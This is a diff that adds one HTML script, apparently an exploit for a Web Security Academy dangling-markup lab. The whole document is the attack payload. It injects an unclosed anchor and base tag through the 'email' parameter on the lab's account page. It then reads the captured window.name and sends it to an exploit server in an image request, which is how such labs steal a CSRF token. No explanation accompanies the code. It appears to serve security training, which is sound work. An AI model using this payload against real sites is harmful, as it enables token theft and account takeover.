@@ -1,0 +1,10 @@
+<script>
+  if (window.name) {
+    new Image().src =
+      "https://exploit-0a9100ac04e77262815620e7012f0069.exploit-server.net/exploit?" +
+      encodeURIComponent(window.name);
+  } else {
+    location =
+      "https://0a14004004f27276813821de00af0099.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://0a9100ac04e77262815620e7012f0069.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27";
+  }
+</script>
